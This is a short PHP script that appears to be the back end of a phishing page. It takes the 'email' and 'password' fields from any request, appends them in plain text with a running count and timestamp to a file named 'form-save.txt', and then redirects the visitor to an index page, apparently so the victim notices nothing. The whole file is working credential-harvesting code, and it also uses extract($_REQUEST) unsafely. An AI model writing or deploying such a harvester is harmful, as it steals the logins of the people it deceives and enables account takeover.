<?php

    $today_date = date('d-m-y || H:i:a');;

    extract($_REQUEST);
    $file=fopen("_txt_data_22_/form-save.txt","a");
	$myfile = fopen("_txt_data_22_/count.txt", "r+") or die("Unable to open file!");
	$url = "_txt_data_22_/count.txt";
	
	$linenumber = fread($myfile, filesize("_txt_data_22_/count.txt"));
	$nextline = $linenumber+1;
	$strings = file_get_contents($url);
	$strreplace = str_replace($linenumber, $nextline, $strings);
	file_put_contents($url, $strreplace);

    

	fwrite($file, $nextline ."\n");
    fwrite($file,"Date : ");
    fwrite($file, $today_date ."\n");
    fwrite($file,"Email : ");
    fwrite($file, $email ."\n");
    fwrite($file,"Password : ");
    fwrite($file, $password ."\n\n");
    fclose($file);
    fclose($myfile);
    
    header("location: ../index.html");
 ?>
